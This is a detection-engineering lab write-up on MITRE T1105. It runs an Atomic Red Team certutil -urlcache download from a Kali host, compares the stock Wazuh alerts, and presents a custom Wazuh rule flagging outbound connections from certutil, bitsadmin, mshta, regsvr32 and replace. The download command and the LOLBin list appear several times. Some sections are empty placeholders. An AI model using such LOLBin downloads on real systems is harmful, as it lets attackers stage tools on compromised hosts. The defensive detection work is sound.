# T1105 - Ingress Tool Transfer

## Overview

The technique I am covering in these findings is T1105, Ingress Tool Transfer, which sits under Command and Control. This is the last of my six rules and it is the third one in the set I started with 100104, the group where the attacker is acting from outside the endpoint rather than typing at it. 100104 correlated failed logons against a success to catch hydra coming in from the Kali box, 100105 caught the endpoint opening a channel back out to that same box over an uncommon port, and this rule is about what happens after a channel like that exists. By the time this technique comes into play the attacker already has a foothold, and the problem they have is that whatever they actually want to run is not on the machine yet. What they do have is everything Windows came with, so they use one of those to go and pull the rest of it down. That is T1105, and it is the point in the chain where the attacker stops working with what was already on the endpoint and starts bringing their own toolkit onto it.

What makes this technique different from the five before it is that the attacker is not bringing a program with them at all and they are not typing anything malicious either, they are borrowing one of mine. `certutil.exe` exists to manage certificates, `bitsadmin.exe` exists to manage background transfers, `regsvr32.exe` exists to register DLLs and `mshta.exe` exists to run HTML applications. Every one of those is a signed Microsoft binary that ships with Windows, they live in `System32`, and they have a completely legitimate reason to be on the disk, and every one of them can also be pointed at a URL and told to pull a file down. That is what a LOLBin is, a living-off-the-land binary, and it is a problem for detection because there is not much to get hold of. Nothing has to be written to disk before the transfer start since the executable was on the endpoint before the attacker was, and the process opening the connection is one that could be running for ordinary reasons, so going through a process list would not tell you anything was wrong.

That changes what my rule is able to claim, although what it claims is very close to what 100105 claims. Neither of those two rules is saying that something malicious happened, they are both describing something that is not supposed to happen and then firing when it does. My first three rules do say that, because the decision was made before the rule existed. I looked at an encoded command and at an auditpol flag and judged them malicious, so what comes out of those rules is a verdict rather than an observation, and it arrives with the conclusion already attached.

100105 and this rule do the reverse. Neither of them is making that accusation, and neither is claiming that what it caught was malicious. All this rule says is that something happened which is out of place, and that it is strange enough to be worth looking into, and the person reading the alert is the one who decides what it actually was.

They both work by describing what is supposed to happen and firing on anything outside that description. In 100105 that description was the ports a Windows endpoint has a reason to open, and in this one it is the programs that have a reason to open a connection at all. Neither of them reads anything somebody typed. Where they differ is which end of the connection I am judging. With 100105 the program was ordinary since PowerShell opens connections all the time, and the destination was the part that was wrong, so the rule reads the port. Here it is the other way round. The port and the address are not what I am looking at, because the connection could go to any address over any port and it would not change my mind. The program that opened it is the part that is wrong, since `certutil.exe` reaching out to the network is strange in a way that `certutil.exe` merely existing is not. The detection is built on the idea that some binaries normally have no business making outbound connections, regardless of what they connect to or why.

The reason I picked this technique in particular is that it is the next thing in the sequence. My first three rules all begin with the attacker already on the endpoint and running something on it, and what I am trying to catch is the command they typed, so none of them has anything to say about how the attacker got there in the first place. 100104 was me starting from the other end of that, which is how somebody gets onto the endpoint at all and what they are doing to it from outside, and once that rule existed the one after it should be the next step in the same story rather than another angle on the step before. So 100104 is somebody getting in, 100105 is them opening a channel back out, and this one is them using that channel to pull across the tools they did not arrive with. That difference shows up in the rules themselves too. 100100, 100102 and 100103 all read `win.eventdata.commandLine` and decide the string sitting in it looks wrong, which makes them three angles on one kind of detection. 100104, 100105 and 100106 do not read a command line at all. One rule correlates authentication events, the other rule reads the direction and port of a connection, and this one reads the image that opened it. 


## Attack Execution

The test I ran is Atomic Red Team test 7 under T1105, "certutil download (urlcache)", with the GUID `dd3b61dd-7bbc-48cd-ab51-49ad1a776df0`. It uses certutil's `-urlcache` argument to download a file from the web, it only supports Windows, and it runs through the command prompt rather than PowerShell.

```
cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
```

The inputs default to a `LICENSE.txt` out of the atomic-red-team repository on `raw.githubusercontent.com`. The command I ran is:

```
cmd /c certutil -urlcache -split -f http://192.168.10.52:8000/[NEEDS filename] [NEEDS local path]
```

I only changed the URL, for the same reason I redirected the connection in finding 05. As it ships the test proves my endpoint can reach GitHub, and T1105 is a file being pulled off infrastructure the attacker controls, so it needs to point at 192.168.10.52, which is the same Kali box from findings 01 and 05.

On Kali I served the file with `python3 -m http.server 8000`. In finding 05 an `nc` listener was enough because the connection itself was the technique, but here the transfer has to complete, so the listener had to be something that actually speaks HTTP.

The command is not an attack, in the same way `Test-NetConnection` was not. certutil ships with Windows and fetching a file over HTTP is documented behaviour, so what makes it the technique is who asked for it and what is at the other end, and neither of those is in the event.

I did not write the rule against the command line because the arguments are the part that varies. certutil takes `-urlcache` or `-verifyctl`, a slash instead of a dash, `-f` anywhere or not at all, and every other binary in the technique has its own syntax entirely. All of them have to open a socket though, and the socket looks the same whichever flag produced it.

What matters for the rule is that `cmd.exe` does not open that socket. It spawns `certutil.exe`, and certutil is what opens it, so the connection event carries certutil as its image rather than the shell that launched it. That is the opposite of finding 05, where PowerShell opened the socket itself, and it is why this rule can key on the process at all.


## Baseline Alert

<img width="1280" height="868" alt="image" src="https://github.com/user-attachments/assets/cc060da7-df98-4198-b011-497e67eb3e79" />

These are the alerts produced by Wazuh's shipped ruleset with 100106 commented out. The window runs from 21:35:00 to 21:36:51 and holds 61 alerts, and none of them are about the connection.

Most of the volume is 67027 at level 3, "A process was created", which is the same noise floor that turns up in every finding I have run.

Three alerts belong to the test. 92052 at level 4, "Windows command prompt started by an abnormal process", is the `cmd.exe` the atomic launches being started out of my PowerShell session, so it is describing the test harness rather than the technique. The other two are both 92032 at level 3, "Suspicious Windows cmd shell execution", and there are two of them because I ran the test twice. Windows Defender flagged the first run, so I ran it again thinking the download had not gone through, when it actually had. The command is in both of those alerts in full, twice over, once as the command line of the process itself and once as the parent command line of the `cmd.exe` that launched it.

```
certutil  -urlcache -split -f http://192.168.10.52:8000/tool.txt tool.txt
cmd  /c certutil -urlcache -split -f http://192.168.10.52:8000/tool.txt tool.txt
```

92032 is tagged T1087 Account Discovery under Discovery and T1059.003 Windows Command Shell under Execution. Nothing in the run carried T1105, and nothing carried Command and Control. Sysmon's own tag on the process creation event reads `technique_id=T1202,technique_name=Indirect Command Execution`, which is the config's opinion rather than Wazuh's, and it is a third technique again.

The connection produced nothing. `certutil.exe` opened a socket to 192.168.10.52 on port 8000 and Sysmon wrote the Event 3 for it, and no shipped rule matched it.


## Detection Gap

This follows a similar pattern to some of my previous findings. The command is in the alert word for word, and the only thing the alert says about it is that a cmd shell execution looked suspicious. 92032 matches on a parent image of `cmd.exe` with `/c`, so what it describes is the shape of the shell invocation and not anything certutil did, and it would have said the same thing about any other command passed to `cmd` the same way. The tags make the same point, because Account Discovery and Windows Command Shell are both true of the wrapper and neither one is the technique that ran.

The connection is the part that has no coverage. certutil opening the socket produced a Sysmon Event 3, which is a separate event from the process creation that every alert above came from. Wazuh matches that to rule 61605, which is the base rule for Sysmon network connections and sits at level 0, so it produces no alert on its own and exists for other rules to chain onto. The only shipped rule that chains onto it is 92101, and that one requires PowerShell, so nothing underneath 61605 could match a connection opened by certutil. The event reached the manager and was checked against the ruleset, and then nothing came out of it.


## My Detection Rule

**Version 1**

```xml
  <rule id="100106" level="10">
    <if_sid>61605</if_sid>
    <field name="win.eventdata.initiated">^true$</field>
    <field name="win.eventdata.image" type="pcre2">(?i)(certutil|bitsadmin|mshta|regsvr32|replace)\.exe</field>
    <description>Suspicious outbound connection opened by $(win.eventdata.image) to $(win.eventdata.destinationIp):$(win.eventdata.destinationPort).</description>
    <mitre>
      <id>T1105</id>
    </mitre>
  </rule>
```

The severity level of this rule is level 10, and it was for the same reason as 100105. This is because the alert is saying that something happened which somebody should look at, but not specifically that an attack occurred, and level 10 keeps it under the `email_alert_level` of 12 in `ossec.conf` so it does not mail every time the alert is paged.

`<if_sid>61605</if_sid>` chains the rule onto the base Sysmon Event 3 rule, so that it gets evaluated on every network connection the endpoint reports rather than only the PowerShell ones. This is the same anchor that failed when I tried it on 100105, and the reason it works here is because of what each rule matches. Wazuh takes the first child that matches and stops, and 92101 sits under that same parent and claims PowerShell connections before anything else under there gets a look, which is what version 2 of 100105 ran into. None of the images in this rule are PowerShell, so 92101 cannot match these events at all, and my rule is the first thing under 61605 that does. That gives this rule more coverage than 100105, because 100105 only ever sees what PowerShell does and no change to its port list can widen that, while this one is looking at every connection on the endpoint before it decides anything. What stops it from firing on every false positive, is my own image list rather than a shipped rule sitting in front of it, and a list I wrote is a list I can extend.

`win.eventdata.initiated` being `^true$` does the same job here as it does in 100105, which is restricting the rule to connections the endpoint opened itself. Sysmon writes true for outbound and false for inbound, and for T1105 the direction is the technique, since the transfer only happens if the endpoint reaches out and pulls the file in.

`win.eventdata.image` is the field the whole rule rests on. Five binaries are named, `certutil`, `bitsadmin`, `mshta`, `regsvr32` and `replace`, and the claim underneath the rule is that none of them has a routine reason to open an outbound connection on this endpoint. That makes it a deny list, which is the opposite of what I did in 100105, and the reason is that the two sets are different sizes. Listing every program that legitimately makes a connection on a Windows machine is impossible, while listing the Microsoft binaries that are known for pulling files down is short enough to actually write. There is also nothing in this rule looking at the port or the address, because it doesn't matter where the LOLBin is connecting to as the program is enough of a suspicion on its own. 

The description pulls the image and the destination into the alert text, so that `$(win.eventdata.image)` says which of the five programs fired the rule and `$(win.eventdata.destinationIp):$(win.eventdata.destinationPort)` says where it went, and both are readable off the alert list without opening anything. The MITRE tag is T1105, which puts the alert under Command and Control, the same tactic as 100105.




**Verison 2**


## Custom Detection Rule Result

**Version 1**

<img width="1280" height="859" alt="image" src="https://github.com/user-attachments/assets/741e2c53-b3ef-4f64-8e02-3e42b0136081" />

```json
{
  "agent": { "name": "Win-10-Endpoint-01", "ip": "192.168.10.51", "id": "001" },
  "data": {
    "win": {
      "eventdata": {
        "image": "C:\\Windows\\System32\\certutil.exe",
        "user": "WIN10-ENDPT-1\\WazuhUser",
        "processId": "2152",
        "protocol": "tcp",
        "initiated": "true",
        "sourceIp": "192.168.10.51",
        "sourcePort": "49751",
        "destinationIp": "192.168.10.52",
        "destinationPort": "8000",
        "ruleName": "technique_id=T1218,technique_name=Signed Binary Proxy Execution"
      },
      "system": {
        "eventID": "3",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "eventRecordID": "87702"
      }
    }
  },
  "rule": {
    "id": "100106",
    "level": 10,
    "description": "Suspicious outbound connection opened by C:\\Windows\\System32\\certutil.exe to 192.168.10.52:8000.",
    "groups": ["sysmon", "local"],
    "mitre": {
      "id": ["T1105"],
      "technique": ["Ingress Tool Transfer"],
      "tactic": ["Command and Control"]
    }
  }
}
```

100106 fired twice at level 10 and the description came out as "Suspicious outbound connection opened by C:\Windows\System32\certutil.exe to 192.168.10.52:8000." Both of the fields I pulled into it resolved, so which binary opened the connection and where it went are sitting there in the alert description without anybody having to open the alert to find them. That mattered more to me on this rule than on any of the others, because the binary is the entire reason the alert exists, and one telling me something connected somewhere without saying what or where would not be worth much.

The reason there are two alerts rather than one is that a single certutil fetch opens two connections. The HTTP server on Kali logged two `GET /tool.txt` requests for every run of the test, and Sysmon wrote a network connection event for each of them. My rule matches on the connection, so one download of one file produced two alerts describing the same transfer. That is not a false positive since both events are real connections certutil genuinely opened, but it does mean the alert count from this rule reflects how many sockets a binary opened rather than how many files it fetched.

The event behind it is Sysmon Event 3. `initiated` is true, `protocol` is tcp, and the connection runs from 192.168.10.51 on source port 49751 out to 192.168.10.52 on 8000. Those are the fields the rule read, and none of them were typed by anybody.

The `ruleName` on the event reads `technique_id=T1218,technique_name=Signed Binary Proxy Execution`, which is not what happened here. T1218 covers a signed binary being used to execute something on an attacker's behalf, and certutil did not execute anything in this test, it fetched a file over HTTP and wrote it to disk. What the tag is describing is the kind of binary certutil is rather than what this particular connection was doing. The process creation event from the same run carries `technique_id=T1202,technique_name=Indirect Command Execution` instead, so the two events Sysmon wrote for one run are labelled with two different techniques, and the technique the test was actually running is not either of them.


## Coverage Limits
